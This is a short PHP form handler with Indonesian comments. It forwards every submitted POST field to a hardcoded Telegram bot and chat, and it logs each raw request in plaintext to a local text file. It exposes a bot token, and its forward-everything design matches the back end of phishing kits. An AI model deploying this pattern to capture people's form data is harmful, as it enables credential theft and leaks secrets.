<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = "7476141028:AAE1GnQ6FXJ-PgCgZ2AqRFEbdWB9ixoOK1E"; // Ganti dengan token bot Anda
    $chat_id = "5715051106"; // Ganti dengan ID chat Anda
    $message = "";

    foreach ($_POST as $key => $value) {
        $message .= $key . ": " . $value . "\n";
    }

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    $result = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    // Log request and response for debugging
    file_put_contents('telegram_log.txt', "Request: " . json_encode($_POST) . "\n", FILE_APPEND);
    file_put_contents('telegram_log.txt', "Response: " . $result . "\n", FILE_APPEND);
    file_put_contents('telegram_log.txt', "Error: " . $error . "\n", FILE_APPEND);

    if ($result) {
        echo "Pesan berhasil dikirim.";
    } else {
        echo "Pesan gagal dikirim.";
    }
}
?>
